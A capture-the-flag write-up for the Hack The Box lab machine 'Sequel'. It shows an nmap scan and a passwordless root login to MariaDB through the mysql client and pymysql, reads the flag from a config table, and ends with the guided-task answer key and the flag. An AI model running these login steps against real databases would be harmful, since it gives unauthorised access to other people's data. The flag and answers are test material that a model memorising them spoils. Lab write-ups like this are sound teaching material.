# Sequel

|            |                                                                          |
|------------|--------------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                                  |
| Difficulty | Very Easy                                                                |
| OS         | Linux                                                                    |
| Tags       | MariaDB, MySQL, Databases, Reconnaissance, Anonymous Access, Weak Creds  |
| Tools      | `nmap`, `mysql` / `mariadb` client (or `pymysql`)                        |

## Summary

A MariaDB instance on port 3306 with no password set on the `root` account.
Connect, list databases, find the custom `htb` database, and the flag is
sitting in the `config` table.

## Recon

Confirm port 3306 is open:

```bash
nmap -sV -p 3306 10.129.109.24
```

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB (unauthorized)
```

## Foothold

`root` has no password. I didn't have a `mysql` client installed locally so I
just used `pymysql` from Python, but the regular client works the same way:

```bash
mysql -h 10.129.109.24 -u root
```

Or in Python:

```python
import pymysql
c = pymysql.connect(host='10.129.109.24', user='root', password='')
cur = c.cursor()
cur.execute("SHOW DATABASES")
print([r[0] for r in cur.fetchall()])
# ['htb', 'information_schema', 'mysql', 'performance_schema']
```

`htb` is the only non-default DB. Switching into it shows two tables:

```sql
USE htb;
SHOW TABLES;
-- config
-- users
```

## Flag

The `config` table has a row keyed `flag`:

```sql
SELECT * FROM config;
```

```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | During our scan, which port do we find serving MySQL? | 3306 |
| 2 | What community-developed MySQL version is the target running? | MariaDB |
| 3 | When using the MySQL command line client, what switch do we need to use in order to specify a login username? | -u |
| 4 | Which username allows us to log into this MariaDB instance without providing a password? | root |
| 5 | In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? | * |
| 6 | In SQL, what symbol do we need to end each query with? | ; |
| 7 | There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? | htb |
